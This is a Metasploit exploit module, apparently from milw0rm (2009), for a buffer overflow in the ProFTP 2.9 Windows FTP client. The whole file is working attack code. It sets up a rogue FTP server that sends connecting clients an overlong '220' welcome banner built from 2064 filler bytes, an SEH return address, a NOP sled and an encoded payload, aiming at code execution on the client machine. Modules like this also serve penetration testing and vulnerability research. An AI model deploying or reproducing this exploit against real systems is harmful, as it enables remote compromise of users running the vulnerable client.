# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ProFTP 2.9 (welcome message) Remote Buffer Overflow Exploit',
			'Description'    => %q{
				This module exploits a buffer overflow in the ProFTP 2.9
				client that is triggered through an excessively long welcome message.
			},
			'Author' 	 => [ 'His0k4 <his0k4.hlm[at]gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     => 
				[ 
					[ 'URL', 'http://www.labtam-inc.com/index.php?act=products&pid=1' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        => 
				[
				# Tested against- xp sp3 en OK.
					[ 'Universal', 	{ 'Ret' => 0x6809d408 } ], # WCMDPA10
				],
			'Privileged'     => false,
			'DefaultTarget'  => 0))

		register_options(
			[ 
				OptPort.new('SRVPORT', [ true, "The FTP daemon port to listen on", 21 ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)	

		buffer =  "220 "
		buffer << rand_text_numeric(2064)
		buffer << [target.ret].pack('V')
		buffer << make_nops(20)
		buffer << payload.encoded
		buffer << "\r\n"
		client.put(buffer)
	end
	
end

# milw0rm.com [2009-08-25]
